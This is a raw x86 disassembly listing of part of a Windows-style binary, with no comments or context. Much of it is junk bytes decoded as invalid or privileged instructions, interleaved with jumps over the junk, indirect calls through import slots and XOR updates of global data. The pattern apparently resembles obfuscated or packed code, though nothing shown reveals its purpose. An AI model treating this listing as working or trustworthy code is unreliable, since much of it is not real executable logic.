  40413b:	das    
  40413c:	lods   al,BYTE PTR ds:[esi]
  40413d:	aas    
  40413e:	jnp    0x40418f
  404140:	dec    ebp
  404141:	repnz xor edx,DWORD PTR [esi+0x7cdbc4bb]
  404148:	jmp    0xbab09092
  40414d:	mov    dh,0xfc
  40414f:	adc    eax,0x747ea944
  404154:	nop
  404155:	cli    
  404156:	push   0xf1f60076
  40415b:	sbb    ebp,edx
  40415d:	jbe    0x4041c9
  40415f:	adc    al,BYTE PTR [eax+0x64]
  404162:	xor    BYTE PTR [eax],dh
  404164:	jbe    0x4041b7
  404166:	call   0x8f3f:0xbd46656c
  40416d:	test   BYTE PTR [eax+0x39f409d0],dl
  404173:	aam    0xab
  404175:	out    0x5c,eax
  404177:	pop    edx
  404178:	or     ah,BYTE PTR fs:[ebx+0x220499da]
  40417f:	fldcw  WORD PTR [esi-0x380aed0c]
  404185:	inc    ebp
  404186:	mov    ah,0x2
  404188:	add    BYTE PTR [eax],al
  40418a:	add    bh,al
  40418c:	inc    ebp
  40418d:	test   al,0x25
  40418f:	xor    al,BYTE PTR [eax]
  404191:	add    bh,al
  404193:	inc    ebp
  404194:	lods   al,BYTE PTR ds:[esi]
  404195:	shr    DWORD PTR [ecx],0x0
  404198:	add    BYTE PTR [ebx+0x43352c3d],al
  40419e:	add    BYTE PTR [eax],al
  4041a0:	jge    0x4041d5
  4041a6:	or     ebx,edx
  4041a8:	jmp    0x4041d5
  4041ad:	push   0x6a4d
  4041b2:	push   DWORD PTR [ebp-0xc]
  4041b5:	push   0x42ed04
  4041ba:	push   0x7215
  4041bf:	push   DWORD PTR [ebp-0x14]
  4041c2:	push   0x29a5
  4041c7:	push   0x4653
  4041cc:	push   DWORD PTR [ebp-0x10]
  4041cf:	call   DWORD PTR ds:0x43c830
  4041d5:	mov    DWORD PTR [ebp-0x60],0x58dc
  4041dc:	jmp    0x4042b4
  4041e1:	adc    ebp,edx
  4041e3:	clc    
  4041e4:	sar    ecx,0xd3
  4041e7:	cmp    edi,edx
  4041e9:	cdq    
  4041ea:	dec    ebx
  4041eb:	mov    bl,BYTE PTR [edi-0x1b04064b]
  4041f1:	(bad)  
  4041f2:	sbb    BYTE PTR [eax],al
  4041f4:	add    BYTE PTR [ebx+0x78000000],bh
  4041fa:	dec    eax
  4041fb:	test   edx,eax
  4041fd:	mov    edi,ds
  4041ff:	jmp    0x4041a3
  404201:	xor    al,0x50
  404203:	adc    BYTE PTR [ecx],0xa3
  404206:	sub    eax,0x244343c3
  40420b:	inc    ecx
  40420c:	inc    esp
  40420d:	setne  bh
  404210:	aas    
  404211:	cli    
  404212:	add    dh,dh
  404214:	cld    
  404215:	jle    0x4041c2
  404217:	push   ebp
  404218:	jne    0x40424a
  40421a:	pop    es
  40421b:	gs xchg ebx,eax
  40421d:	js     0x4041a6
  40421f:	push   esp
  404220:	stos   BYTE PTR es:[edi],al
  404221:	sbb    bh,0x26
  404224:	add    edi,DWORD PTR ds:0xe3fc9019
  40422a:	fmul   st(0),st
  40422c:	ror    BYTE PTR [ecx],1
  40422e:	stos   BYTE PTR es:[edi],al
  40422f:	iret   
  404230:	xchg   edi,edi
  404232:	inc    esi
  404233:	ins    BYTE PTR es:[edi],dx
  404234:	mov    ds:0x5979061e,eax
  404239:	in     al,dx
  40423a:	je     0x4041e5
  40423c:	xchg   edi,eax
  40423d:	jmp    0x404203
  40423f:	mov    eax,DWORD PTR [ecx+0x78]
  404242:	fstp   QWORD PTR [ecx+ebp*8+0x2e6da40f]
  404249:	in     eax,dx
  40424a:	xchg   ebp,eax
  40424b:	and    ah,BYTE PTR [esi-0x2b]
  40424e:	les    eax,FWORD PTR [edx-0x62]
  404251:	ins    DWORD PTR es:[edi],dx
  404252:	xor    ebp,DWORD PTR [eax+0xf]
  404255:	or     DWORD PTR [ebx+esi*4+0x70],eax
  404259:	leave  
  40425a:	cmp    ebx,edi
  40425c:	hlt    
  40425d:	fistp  QWORD PTR [ecx+ecx*2]
  404260:	into   
  404261:	fisub  WORD PTR [edi-0xe7b9451]
  404267:	xchg   ebp,eax
  404268:	jge    0x4042ae
  40426a:	dec    ecx
  40426b:	mov    ch,0xbd
  40426d:	in     al,dx
  40426e:	test   eax,0xc8472fbd
  404273:	lds    esi,FWORD PTR [esi-0x26de7f85]
  404279:	lock sbb eax,0x8aeac756
  40427f:	icebp  
  404280:	lods   al,BYTE PTR ds:[esi]
  404281:	push   esi
  404282:	and    BYTE PTR [ebp+0x3f],al
  404285:	jg     0x404216
  404287:	fwait
  404288:	cmp    al,0x6e
  40428a:	cwde   
  40428b:	shr    DWORD PTR [edi-0x36],1
  40428e:	xor    ecx,ebx
  404290:	pop    ds
  404291:	push   ebp
  404292:	xor    eax,0x172856c2
  404297:	jl     0x4042fe
  404299:	in     al,dx
  40429a:	xchg   ebx,eax
  40429b:	mov    ecx,0x5d677b42
  4042a0:	sub    eax,0xddeee595
  4042a5:	or     eax,0x9e43af8a
  4042aa:	xor    al,BYTE PTR fs:[ecx+eax*2-0x26]
  4042af:	not    BYTE PTR [edx-0x38956e3f]
  4042b5:	inc    ebp
  4042b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4042b7:	jl     0x404311
  4042b9:	add    BYTE PTR [eax],al
  4042bb:	mov    DWORD PTR [ebp-0x38],0xac8
  4042c2:	jmp    0x40439a
  4042c7:	(bad)  
  4042c8:	cmp    ebp,esi
  4042ca:	jl     0x4042ca
  4042cc:	std    
  4042cd:	lahf   
  4042ce:	sti    
  4042cf:	inc    edx
  4042d0:	pop    edi
  4042d1:	fst    DWORD PTR [ebp+0x1cfaeeb5]
  4042d7:	xchg   ecx,eax
  4042d8:	sbb    DWORD PTR [eax],eax
  4042da:	add    BYTE PTR [ebx+0x6a000000],bh
  4042e0:	jg     0x404345
  4042e2:	aam    0x58
  4042e4:	scas   eax,DWORD PTR es:[edi]
  4042e5:	sti    
  4042e6:	dec    esi
  4042e7:	in     al,0x77
  4042e9:	bound  ebx,QWORD PTR [ebx-0x3c3acf66]
  4042ef:	mov    bh,0x2d
  4042f1:	xor    bh,ch
  4042f3:	mov    ds:0xaf7556aa,al
  4042f8:	sbb    BYTE PTR [ebx],ch
  4042fa:	imul   DWORD PTR [edx+0x37]
  4042fd:	dec    esp
  4042fe:	lods   al,BYTE PTR gs:[esi]
  404300:	test   edx,0x5f83bfc3
  404306:	jecxz  0x4042ff
  404308:	fmul   st,st(2)
  40430a:	and    BYTE PTR [eax],dl
  40430c:	sub    eax,0xa787ea91
  404311:	mov    al,ds:0x4cb16fd2
  404316:	push   ds
  404317:	pop    esi
  404318:	dec    ecx
  404319:	jmp    0x5ca3:0xcf3ce8d8
  404320:	popf   
  404321:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404322:	pop    edi
  404323:	fsubr  DWORD PTR [esi-0x38a4391d]
  404329:	sbb    BYTE PTR [ecx+0x37dcb55f],dh
  40432f:	mov    edi,0xd72ede12
  404334:	jo     0x4042fa
  404336:	jbe    0x404353
  404338:	js     0x4042cc
  40433a:	xlat   BYTE PTR ds:[ebx]
  40433b:	push   0x400bdcad
  404340:	pushf  
  404341:	dec    esp
  404342:	mov    ebp,0xd71c2224
  404347:	pop    edx
  404348:	dec    esi
  404349:	pop    edx
  40434a:	loopne 0x4042ef
  40434c:	rcl    edi,cl
  40434e:	xchg   DWORD PTR [edi],esi
  404350:	mov    dh,0xf6
  404352:	mov    ebx,0xa7658d63
  404357:	sbb    DWORD PTR [edx+0x29],eax
  40435a:	mov    eax,0x2f7d27e4
  40435f:	loopne 0x4042fc
  404361:	push   ecx
  404362:	scas   al,BYTE PTR es:[edi]
  404363:	scas   al,BYTE PTR es:[edi]
  404364:	mov    esp,edx
  404366:	jae    0x404311
  404368:	dec    BYTE PTR [ebx]
  40436a:	sub    esi,DWORD PTR [ebx+0x1fbca33]
  404370:	sbb    al,0xd4
  404372:	pop    eax
  404373:	and    BYTE PTR [eax],cl
  404375:	add    al,0x6d
  404377:	mov    WORD PTR [edx-0x40],es
  40437a:	inc    ebx
  40437b:	jle    0x4043d4
  40437d:	pop    es
  40437e:	mov    ecx,0xe0029fac
  404383:	mov    al,ds:0xca4c4df7
  404388:	call   0x996b:0x25839b0
  40438f:	out    dx,eax
  404390:	mov    ebp,es
  404392:	jmp    0x4043ee
  404394:	and    esp,edi
  404396:	scas   eax,DWORD PTR es:[edi]
  404397:	xchg   esp,eax
  404398:	in     eax,0x50
  40439a:	mov    DWORD PTR [ebp-0x34],0x48df
  4043a1:	mov    eax,DWORD PTR [ebp-0x60]
  4043a4:	mov    ecx,DWORD PTR [ebp-0x5c]
  4043a7:	mov    edx,DWORD PTR [ebp-0x58]
  4043aa:	movzx  ebx,BYTE PTR ds:0x433638
  4043b1:	xor    DWORD PTR ds:0x433558,ebx
  4043b7:	mov    ebx,DWORD PTR [ebp-0x54]
  4043ba:	jmp    0x404492
  4043bf:	jmp    0xffffb2ff
  4043c4:	(bad)  
  4043c5:	stc    
  4043c6:	jg     0x4043d4
  4043c8:	cmp    esi,DWORD PTR [edx-0x39]
  4043cb:	fistp  QWORD PTR [edx+0x1a4c4e6a]
  4043d1:	add    BYTE PTR [eax],al
  4043d3:	mov    ebx,0x46000000
  4043d8:	add    DWORD PTR [ecx+0x31e091f],eax
  4043de:	div    ch
  4043e0:	push   ecx
  4043e1:	ins    DWORD PTR es:[edi],dx
  4043e2:	stos   BYTE PTR es:[edi],al
  4043e3:	and    dl,BYTE PTR [ebx]
  4043e5:	mov    esi,DWORD PTR [ecx]
  4043e7:	mov    al,ds:0xd981c649
  4043ec:	sub    DWORD PTR [ecx+ecx*1+0x1c],esp
  4043f0:	inc    ecx
  4043f1:	xchg   BYTE PTR [esi-0x5e],bh
  4043f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4043f5:	js     0x40437b
  4043f7:	hlt    
  4043f8:	inc    edx
  4043f9:	dec    esi
  4043fa:	ins    DWORD PTR es:[edi],dx
  4043fb:	add    DWORD PTR [edi-0xe],0xffffffa7
  4043ff:	mov    WORD PTR [ebp-0x26],ds
  404402:	fist   DWORD PTR [ebx-0x539a9331]
  404408:	or     eax,0x7dd4f6cb
  40440d:	pop    ds
  40440e:	mov    ss,WORD PTR [edx+edi*1]
  404411:	(bad)  
  404412:	or     DWORD PTR [ebx-0x64],edi
  404415:	add    cl,BYTE PTR [esp+ebx*8]
  404418:	call   0x9a45:0x71d59331
  40441f:	clc    
  404420:	(bad)  
  404421:	pop    es
  404422:	ja     0x404489
  404424:	cld    
  404425:	xchg   esp,eax
  404426:	sub    al,0xdc
  404428:	and    bl,BYTE PTR [ebp-0x10]
  40442b:	das    
  40442c:	shl    DWORD PTR [eax],cl
  40442e:	xor    eax,0x27f32718
  404433:	test   al,0xc9
  404435:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404436:	dec    ecx
  404437:	call   DWORD PTR [esi]
  404439:	int3   
  40443a:	xchg   esp,eax
  40443b:	lods   al,BYTE PTR ds:[esi]
  40443c:	ins    BYTE PTR es:[edi],dx
  40443d:	popa   
  40443e:	pop    ecx
  40443f:	in     eax,0xf2
  404441:	or     al,0x6
  404443:	jp     0x4044b9
  404445:	mov    dh,0x41
  404447:	std    
  404448:	test   DWORD PTR [eax+0x26],esi
  40444b:	int    0xa2
  40444d:	ds xchg ecx,eax
  40444f:	inc    ecx
  404450:	std    
  404451:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404452:	and    al,0xa3
  404454:	adc    eax,0x58414ce8
  404459:	sbb    eax,edx
  40445b:	or     BYTE PTR [edi+0x22ff2aab],al
  404461:	inc    ecx
  404462:	clc    
  404463:	sar    DWORD PTR [ebx],0x2f
  404466:	jle    0x4044d1
  404468:	leave  
  404469:	stc    
  40446a:	fwait
  40446b:	pop    eax
  40446c:	add    DWORD PTR [edx-0x66d95b54],eax
  404472:	push   esp
  404473:	cmp    ebx,DWORD PTR [ebx+0x8]
  404476:	and    DWORD PTR [ebx+eax*1+0x629c0daa],ebx
  40447d:	inc    edx
  40447e:	and    al,BYTE PTR [ebx+0x31f3b8e8]
  404484:	cli    
  404485:	imul   ebp,edx,0xffffffce
  404488:	add    al,0xcf
  40448a:	ret    0xd1b3
  40448d:	mov    BYTE PTR [edi*4-0x3dfc30aa],cl
  404494:	mov    edx,DWORD PTR [ebp-0x50]
  404497:	mov    DWORD PTR ds:0x433534,0x2708
  4044a1:	adc    ecx,ebx
  4044a3:	mov    ebx,DWORD PTR [ebp-0x4c]
  4044a6:	push   ebx
  4044a7:	jmp    0x40457f
  4044ac:	mov    ebx,0xaf87a91c
  4044b1:	mov    bh,0xbf
  4044b3:	cmp    al,0x3
  4044b5:	leave  
  4044b6:	inc    ecx
  4044b7:	xor    ebx,DWORD PTR [ecx]
  4044b9:	repnz mov cl,0xbf
  4044bc:	pop    es
  4044bd:	sbb    eax,DWORD PTR [eax]
  4044bf:	add    BYTE PTR [ebx+0x24000000],bh
  4044c5:	cmp    ah,BYTE PTR [eax-0x40]
  4044c8:	dec    ebx
  4044c9:	in     al,0xc1
  4044cb:	rcl    BYTE PTR [edx],0x62
  4044ce:	jl     0x404491
  4044d0:	pop    edx
  4044d1:	push   0x44
  4044d3:	or     dl,BYTE PTR [esi+0x73]
  4044d6:	icebp  
  4044d7:	ror    edx,0x33
  4044da:	jno    0x404516
  4044dc:	in     al,0x10
  4044de:	loopne 0x40452d
  4044e0:	and    al,0xde
  4044e2:	mov    ebx,0x12d16808
  4044e7:	cwde   
  4044e8:	repz jb 0x404507
  4044eb:	or     eax,0x24459720
  4044f0:	add    eax,DWORD PTR [eax]
  4044f2:	inc    eax
  4044f3:	test   DWORD PTR [eax-0x4e],ebp
  4044f6:	pop    esi
  4044f7:	mov    dl,0x61
  4044f9:	sub    eax,0xadf73a0d
  4044fe:	imul   esi,DWORD PTR [ecx+ebp*4],0x3de99a52
  404505:	xor    ah,BYTE PTR [esi-0x3b82fc94]
  40450b:	call   ecx
  40450d:	add    BYTE PTR [edi-0x3],cl
  404510:	push   ebp
  404511:	int    0x97
  404513:	cmp    al,0xff
  404515:	mov    ds:0x1dadc2a0,eax
  40451a:	out    dx,eax
  40451b:	clc    
  40451c:	aam    0x49
  40451e:	inc    edi
  40451f:	clc    
  404520:	and    eax,0xfaff4510
  404525:	in     eax,0x5d
  404527:	lds    edx,FWORD PTR [ecx]
  404529:	mov    al,0xdd
  40452b:	or     eax,0x3779b424
  404530:	dec    eax
  404531:	mov    ecx,0xf528e87f
  404536:	sub    DWORD PTR [esi],ecx
  404538:	mov    ds:0xb8dd199,al
  40453d:	shl    DWORD PTR [edx],1
  40453f:	not    bh
  404541:	push   esp
  404542:	push   edi
  404543:	dec    esi
  404544:	push   ecx
  404545:	push   esp
  404546:	inc    eax
  404547:	mov    ds:0x3f1984d,al
  40454c:	jbe    0x4044db
  40454e:	jmp    0x3949f937
  404553:	pop    eax
  404554:	lds    ecx,FWORD PTR es:[ecx-0x11bdf3e5]
  40455b:	stos   DWORD PTR es:[edi],eax
  40455c:	adc    cl,dl
  40455e:	lds    esp,FWORD PTR [ebx-0x47]
  404561:	mov    esp,0x5c93afdd
  404566:	mov    ah,bl
  404568:	or     edx,DWORD PTR [eax+0x59253f7]
  40456e:	cmp    BYTE PTR [edx-0x4],dl
  404571:	inc    edi
  404572:	jp     0x4045bd
  404574:	imul   ecx,DWORD PTR [ebp-0x3c2e0a96],0xe98f8678
  40457e:	pop    esi
  40457f:	push   edx
  404580:	xor    DWORD PTR ds:0x43356c,0x433590
  40458a:	push   ecx
  40458b:	adc    DWORD PTR ds:0x433620,0x433594
  404595:	push   eax
  404596:	and    DWORD PTR ds:0x433654,0x5c90
  4045a0:	call   0x423dad
  4045a5:	xor    edx,edx
  4045a7:	mov    ecx,DWORD PTR [ebp-0x38]
  4045aa:	mov    edx,DWORD PTR [ebp-0x34]
  4045ad:	and    DWORD PTR ds:0x433574,ebx
  4045b3:	mov    edx,0x4441
  4045b8:	xor    DWORD PTR ds:0x4335dc,edi
  4045be:	sub    edx,ecx
  4045c0:	mov    DWORD PTR ds:0x433560,0x1de2
  4045ca:	mov    ecx,DWORD PTR [ebp+0x14]
  4045cd:	adc    DWORD PTR ds:0x4335d4,edi
  4045d3:	and    eax,0x1024
  4045d8:	or     edx,0x5cfd
  4045de:	sub    edx,eax
  4045e0:	mov    eax,DWORD PTR [ebp-0x8]
  4045e3:	lea    eax,[edx+eax*1-0x6df9]
  4045ea:	dec    DWORD PTR ds:0x433660
  4045f0:	add    eax,DWORD PTR [ebp+0x28]
  4045f3:	xor    edx,ebx
  4045f5:	jmp    0x4046cd
  4045fa:	clc    
  4045fb:	xor    BYTE PTR [eax],ch
  4045fd:	ret    
  4045fe:	call   0x587c41de
  404603:	xor    eax,edi
  404605:	xor    eax,DWORD PTR [ebx]
  404607:	sub    ebx,DWORD PTR ds:0x1bc202
  40460d:	add    BYTE PTR [ebx+0x47000000],bh
  404613:	test   eax,0xa0da6604
  404618:	int    0xb9
  40461a:	and    BYTE PTR [ebx-0x7f6eebcc],0xe5
  404621:	and    BYTE PTR [esi],0x7d
  404624:	adc    ebp,DWORD PTR [ebp+0x45]
  404627:	inc    esp
  404628:	push   cs
  404629:	fld    TBYTE PTR [edx-0x1d]
  40462c:	cdq    
  40462d:	adc    eax,0xcc87c60f
  404632:	std    
  404633:	xchg   esi,eax
  404634:	and    al,BYTE PTR [ebx]
  404636:	sub    cl,BYTE PTR [ebp-0x25]
  404639:	push   esp
  40463a:	sti    
  40463b:	ret    
  40463c:	shl    BYTE PTR [ebx],cl
  40463e:	(bad)  
  40463f:	mov    al,ds:0x75a74327
  404644:	fld    st(7)
  404646:	mov    eax,ds:0x4d45ab81
  40464b:	sub    al,0x55
  40464d:	ins    DWORD PTR es:[edi],dx
  40464e:	or     BYTE PTR [edi+edx*2+0x41db940e],0xff
  404656:	or     al,0xe3
  404658:	mov    eax,esp
  40465a:	jecxz  0x4046cd
  40465c:	inc    edi
  40465d:	rol    DWORD PTR [ecx+0x5a],cl
  404660:	popa   
  404661:	xor    esp,DWORD PTR [edx+ebp*4+0x73]
  404665:	mov    esp,DWORD PTR [edx*4-0x7304469d]
  40466c:	sar    BYTE PTR [edx+0x4b71876a],cl
  404672:	inc    eax
  404673:	sbb    BYTE PTR [eax+0x5fc866a1],bh
  404679:	mov    ds:0x142f1e71,al
  40467e:	inc    ebp
  40467f:	mov    bh,0xea
  404681:	test   bh,bh
  404683:	ins    BYTE PTR es:[edi],dx
  404684:	es push 0xac89294e
  40468a:	int3   
  40468b:	cmp    DWORD PTR [edi],ecx
  40468d:	push   eax
  40468e:	mov    edi,0x5477cd4a
  404693:	repnz loopne 0x4046cc
  404696:	add    al,0x3
  404698:	mov    bh,0x1d
  40469a:	or     BYTE PTR [ecx],dl
  40469c:	push   0x5d
  40469e:	lods   eax,DWORD PTR ds:[esi]
  40469f:	adc    DWORD PTR [ecx-0x4e],edx
  4046a2:	xor    eax,0xb15bc4db
  4046a7:	mov    al,0xf3
  4046a9:	push   cs
  4046aa:	jbe    0x404654
  4046ac:	xchg   ecx,eax
  4046ad:	push   ebx
  4046ae:	out    dx,al
  4046af:	dec    ecx
  4046b0:	out    0x7d,eax
  4046b2:	in     al,dx
  4046b3:	sub    al,0x97
  4046b5:	dec    edi
  4046b6:	jmp    0x40464d
  4046b8:	out    dx,al
  4046b9:	hlt    
  4046ba:	leave  
  4046bb:	xchg   dl,ch
  4046bd:	dec    ebp
  4046be:	test   al,0x10
  4046c0:	pop    ss
  4046c1:	push   esi
  4046c2:	(bad)  
  4046c3:	mov    esi,0x1c7da6a2
  4046c8:	mov    DWORD PTR [edx],ebp
  4046ca:	pop    es
  4046cb:	sti    
  4046cc:	mov    esi,0xacffbb
  4046d1:	add    BYTE PTR [ecx+0x4336541d],al
  4046d7:	add    BYTE PTR [edx-0x76ffff97],ch
  4046dd:	inc    ebp
  4046de:	clc    
  4046df:	mov    eax,DWORD PTR [ecx]
  4046e1:	movzx  edx,BYTE PTR ds:0x433590
  4046e8:	adc    edx,DWORD PTR ds:0x43358c
  4046ee:	mov    DWORD PTR ds:0x433590,edx
  4046f4:	mov    edx,DWORD PTR [ecx+0x4]
  4046f7:	sub    DWORD PTR ds:0x433650,0x433630
  404701:	jmp    0x4047d9
  404706:	add    DWORD PTR [edi],eax
  404708:	out    0xfc,eax
  40470a:	out    0xfc,eax
  40470c:	sbb    edi,edi
  40470e:	and    esp,DWORD PTR [eax]
  404710:	mov    bl,0xe4
  404712:	loopne 0x4046b1
  404714:	pop    eax
  404715:	in     al,0x7d
  404717:	sbb    al,0x0
  404719:	add    BYTE PTR [ebx+0x4b000000],bh
  40471f:	mov    cl,0xcf
  404721:	add    al,0xd2
  404723:	int3   
  404724:	push   es
  404725:	jne    0x4046a9
  404727:	clc    
  404728:	pop    ebx
  404729:	ficomp WORD PTR [edi+0x3c]
  40472c:	jmp    0x404740
  40472e:	cmp    bl,BYTE PTR [eax+edi*1+0x16]
  404732:	mov    esp,0x597cc686
  404737:	push   esp
  404738:	push   0x22de69a1
  40473d:	out    0x8a,al
  40473f:	out    0x22,al
  404741:	jmp    DWORD PTR [edi]
  404743:	mov    ch,cl
  404745:	addr16 jl 0x404751
  404748:	xor    edi,DWORD PTR [esi+0x48]
  40474b:	mov    ebp,0x6f0dc5a4
  404750:	and    eax,0x5679bf45
  404755:	les    edi,FWORD PTR [ecx]
  404757:	ret    
  404758:	in     eax,0x16
  40475a:	cmp    bl,BYTE PTR [ebp+ebx*8-0x6004b928]
  404761:	test   DWORD PTR [esi+0x1257cc97],0x8ee4722e
  40476b:	inc    esi
  40476c:	std    
  40476d:	or     al,0xb3
  40476f:	popa   
  404770:	jmp    0xcbb4120d
  404775:	dec    esi
  404776:	repnz scas al,BYTE PTR es:[edi]
  404778:	ds enter 0x6352,0xca
  40477d:	cmp    esp,esp
  40477f:	fstp   st(6)
  404781:	inc    ebp
  404782:	mov    ah,0xe1
  404784:	cmp    al,0xf6
  404786:	ror    BYTE PTR [ecx],0xd5
  404789:	(bad)  
  40478a:	sar    DWORD PTR [edx-0xc],1
  40478d:	fwait
  40478e:	xor    DWORD PTR [edx+0x58dc1d38],ecx
  404794:	icebp  
  404795:	fdivr  st,st(5)
  404798:	sbb    cl,bh
  40479a:	adc    bh,BYTE PTR [ecx+0x4ad79683]
  4047a0:	jo     0x4047f1
  4047a2:	cdq    
  4047a3:	in     eax,0x2f
  4047a5:	or     BYTE PTR [esi],bl
  4047a7:	outs   dx,DWORD PTR ds:[esi]
  4047a8:	add    bl,BYTE PTR [eax+eiz*4]
  4047ab:	cmp    al,0x66
  4047ad:	add    DWORD PTR [eax-0xd5b8bd3],edi
  4047b3:	inc    ebp
  4047b4:	push   ecx
  4047b5:	aaa    
  4047b6:	stos   BYTE PTR es:[edi],al
  4047b7:	adc    al,0x91
  4047b9:	sub    edi,DWORD PTR [esi]
  4047bb:	dec    edi
  4047bc:	and    BYTE PTR [eax+0x28c4af11],ch
  4047c2:	sbb    al,0xb9
  4047c4:	out    0xea,al
  4047c6:	mov    dh,0x7c
  4047c8:	nop
  4047c9:	popa   
  4047ca:	rcl    BYTE PTR [edx+0x52638dc],1
  4047d0:	out    0x82,eax
  4047d2:	cmp    eax,0xd4dc3997
  4047d7:	ret    
  4047d8:	(bad)  
  4047d9:	xor    eax,esi
  4047db:	mov    edx,DWORD PTR ds:0x4335cc
  4047e1:	or     DWORD PTR ds:0x433568,edx
  4047e7:	jmp    0x4048bf
  4047ec:	jns    0x4047ef
  4047ee:	mov    esp,0x7dbdfcb1
  4047f3:	leave  
  4047f4:	(bad)  
  4047f6:	scas   al,BYTE PTR es:[edi]
  4047f7:	mov    edi,0xe46d9a12
  4047fc:	cmp    BYTE PTR ds:0xbb0000,bl
  404802:	add    BYTE PTR [eax],al
  404804:	inc    esi
  404805:	es clc 
  404807:	cs xor ecx,edx
  40480a:	or     al,0x6a
  40480c:	add    dl,BYTE PTR [edx]
  40480e:	das    
  40480f:	mov    bl,0xbb
  404811:	adc    al,0xb7
  404813:	ret    0x867
  404816:	pop    ebx
  404817:	pushf  
  404818:	or     al,0x9f
  40481a:	mov    ds:0xf0279e8a,al
  40481f:	popa   
  404820:	mov    DWORD PTR [edx+0x50],eax
  404823:	ret    
  404824:	scas   eax,DWORD PTR es:[edi]
  404825:	cmp    edx,DWORD PTR [ecx+0x6cd650e5]
  40482b:	outs   dx,DWORD PTR ds:[esi]
  40482c:	out    0xea,eax
  40482e:	inc    edx
  40482f:	pop    ebp
  404830:	mov    ecx,0xbacfec87
  404835:	int    0x95
  404837:	data16 jmp 0x404892
  40483a:	or     ecx,DWORD PTR [ecx]
  40483c:	imul   BYTE PTR [eax+0x24]
  40483f:	jmp    0x404876
  404841:	xchg   ebp,eax
  404842:	(bad)  
  404844:	fild   WORD PTR [esi-0x1dc19a05]
  40484a:	sub    ah,BYTE PTR [edx]
  40484c:	jl     0x40484f
  40484e:	call   0x47de:0x34f69dbb
  404855:	mov    ds:0x5f382160,al
  40485a:	and    dh,al
  40485c:	outs   dx,DWORD PTR ds:[esi]
  40485d:	mov    esi,0x89bc997c
  404862:	sti    
  404863:	mov    ecx,0xb6a8dea2
  404868:	adc    edx,0xffffff9b
  40486b:	sbb    BYTE PTR [eax+0xa],ah
  40486e:	fdiv   DWORD PTR [edx+0x16]
  404871:	dec    DWORD PTR [edi+0x45]
  404874:	xchg   BYTE PTR [ecx-0x35],bh
  404877:	sub    al,0x46
  404879:	cmc    
  40487a:	xchg   edx,eax
  40487b:	icebp  
  40487c:	dec    esp
  40487d:	shl    BYTE PTR [eax+0x525f12f7],1
  404883:	jmp    0x5d2af720
  404888:	adc    eax,0x559e3700
  40488d:	cmp    eax,0x9cd67f30
  404892:	popf   
  404893:	and    eax,0x266c0a0b
  404898:	jb     0x4048f8
  40489a:	(bad)  
  40489b:	imul   esp,DWORD PTR [ecx+0x16256ef7],0x6b
  4048a2:	shl    DWORD PTR [ebp+0x445d04e],cl
  4048a8:	dec    ecx
  4048a9:	retf   
  4048aa:	fs xchg ebp,eax
  4048ac:	lods   al,BYTE PTR ds:[esi]
  4048ad:	mov    cl,0x93
  4048af:	jge    0x40486c
  4048b1:	sahf   
  4048b2:	pusha  
  4048b3:	adc    eax,0x28e30e3
  4048b8:	fwait
  4048b9:	add    eax,0x9e9e1e91
  4048be:	sti    
  4048bf:	mov    DWORD PTR [ebp-0x24],eax
  4048c2:	mov    eax,ds:0x4336f4
  4048c7:	mov    edx,DWORD PTR ds:0x430024
  4048cd:	sub    eax,edx
  4048cf:	xor    eax,DWORD PTR [eax+edx*1]
  4048d2:	mov    eax,DWORD PTR [ecx]
  4048d4:	cmp    DWORD PTR ds:0x433574,0x0
  4048db:	jb     0x4048fe
  4048e1:	movzx  edx,WORD PTR ds:0x433678
  4048e8:	and    DWORD PTR ds:0x433594,edx
  4048ee:	jmp    0x4048fe
  4048f3:	push   0x26e4
  4048f8:	call   DWORD PTR ds:0x43c834
  4048fe:	mov    edx,DWORD PTR [ecx+0x4]
  404901:	jmp    0x4049d9
  404906:	pop    ebp
  404907:	push   edx
  404908:	jmp    0xd1db:0x7dfeefd6
  40490f:	sar    BYTE PTR [edx+eax*1+0x33209f70],1
  404916:	repz sbb eax,0xbb0000
  40491c:	add    BYTE PTR [eax],al
  40491e:	(bad)
  404921:	mov    ebx,0xea2ed017
  404926:	rcr    DWORD PTR [edi],1
  404928:	fwait
  404929:	cmp    esp,edi
  40492b:	cmp    ch,BYTE PTR [esi-0x37648d12]
  404931:	and    eax,ecx
  404933:	or     al,0x89
  404935:	fsub   QWORD PTR [edi-0x1]
  404938:	dec    ebx
  404939:	pop    edx
  40493a:	sbb    BYTE PTR [ecx+0x58],ch
  40493d:	js     0x4048d6
  40493f:	pop    edi
  404940:	mov    eax,ds:0xa7d7d1a4
  404945:	and    cl,dl
  404947:	pop    eax
  404948:	fst    DWORD PTR [edx+0x542ce035]
  40494e:	push   ebp
  404950:	ror    edi,0xb4
  404953:	das    
  404954:	inc    eax
  404955:	sbb    eax,0xa0ed3bba
  40495a:	int    0x90
  40495c:	ss pop ecx
  40495e:	push   edi
  40495f:	mov    BYTE PTR [ecx-0x567a18cd],bl
  404965:	into   
  404966:	cmc    
  404967:	sub    al,0x43
  404969:	jmp    0x2ed02bff
  40496e:	adc    DWORD PTR [edi+0x1f87f918],esi
  404974:	pop    edi
  404975:	daa    
  404976:	add    al,0xdc
  404978:	pop    ecx
  404979:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40497a:	and    ah,bh
  40497c:	pop    esp
  40497d:	add    al,0xb0
  40497f:	test   eax,0x1977b056
  404984:	adc    eax,0x1590397c
  404989:	cmp    dh,BYTE PTR [ebx-0x33]
  40498c:	push   es
  40498d:	outs   dx,BYTE PTR ds:[esi]
  40498e:	mov    al,0x34
  404990:	inc    esi
  404991:	xlat   BYTE PTR ds:[ebx]
  404992:	push   ss
  404993:	and    al,0xef
  404995:	add    eax,0x3b4cf878
  40499a:	mov    ebp,0x12432f5e
  40499f:	fcomp  QWORD PTR [esi+eax*4]
  4049a2:	adc    al,0xd8
  4049a4:	push   esp
  4049a5:	ret    
  4049a6:	xlat   BYTE PTR ds:[ebx]
  4049a7:	(bad)  [edi-0x4f]
  4049aa:	mov    bh,0x12
  4049ac:	pop    ecx
  4049ad:	cmp    ch,BYTE PTR ds:0x7676479a
  4049b3:	inc    edi
  4049b4:	sar    BYTE PTR [edx+0x26c15c2d],1
  4049ba:	pop    esp
  4049bb:	pop    edx
  4049bc:	xor    al,0x1
  4049be:	pop    es
  4049bf:	ins    DWORD PTR es:[edi],dx
